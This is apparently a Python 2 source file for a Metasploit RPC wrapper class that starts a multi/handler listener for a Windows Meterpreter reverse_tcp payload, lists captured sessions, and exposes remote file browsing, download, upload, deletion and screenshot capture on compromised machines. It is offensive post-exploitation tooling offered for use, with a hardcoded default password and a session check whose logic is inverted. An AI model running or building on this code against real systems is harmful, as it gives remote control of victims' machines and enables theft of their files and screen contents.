from metasploit.msfrpc import MsfRpcClient
from tools import explorer
from tools import screenshot

import os
import socket
import fcntl
import struct


class MsfToolbox:
	"""
    Metasploit RPC listens locally to the port by default (55553)
    msfrpcd -P mypassword -n -f -a 127.0.0.1
	# os.system("msfrpcd -P " + mypassword + " -n -f -a 127.0.0.1")

	Paradigme de delegation pour les differents modules qui correspondent a des fonctionnalites
    """
	def __init__(self, password='mypassword', port=55553):
		self._port = port
		self._password = password

		self.init_client()

		# self._ip = get_ip_address('eth0') On docker it's easier to put in by hand
		self._ip = '172.17.0.3'

	def init_client(self):
		self._client = MsfRpcClient(self._password, port=self._port)

	def exploit_multi_handler(self, lport=4444):
		exploit = self._client.modules.use('exploit', 'multi/handler')
		pl = self._client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
		pl['LPORT'] = lport
		pl['LHOST'] = self._ip
		pl['EXITFUNC'] = 'thread'

		exploit.execute(payload=pl)


	def get_ip_address(self, ifname):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(
		                        s.fileno(),
								0x8915,  # SIOCGIFADDR
								struct.pack('256s', ifname[:15])
								)[20:24])


	def get_sessions(self):
		return self._client.sessions.list


	def get_session_shell(self, index):
		return self._client.sessions.session(index)


	def get_client(self):
	    return self._client


	def get_jobs(self):
	    return self._client.jobs.list


	def search(self, search_type, pattern):
	    search_set = { "EXPLOIT":  self._client.modules.exploits,
	                   "POST": self._client.modules.post }
	    print filter(lambda x: pattern in x, search_set[search_type])


	def is_connexion_established(self):
	    return not self._client.sessions.list


	# Explorer
	def ls(self, shell):
		return explorer.ls(shell)


	def cd(self, shell, arg):
		return explorer.cd(shell, arg)


	def download(self, shell, name):
		return explorer.download(shell, name)

	def upload(self, shell, file):
		return explorer.upload(shell, file)

	def rm(self, shell, name):
		return explorer.rm(shell, name)

	def rmdir(self, shell, name):
		return explorer.rmdir(shell, name)

	def add_routing_files(self, files):
		return explorer.add_routing_files(files)


	# Screenshot
	def post_take_screenshot(self, session=1, path="~/screenshot_sample.jpg", count=1, delay=0, record=True, view_screenshots=False):
		screenshot.post_take_screenshot(self._client, session, path, count, delay, record, view_screenshots)


	def get_images(self):
		return screenshot.get_images()
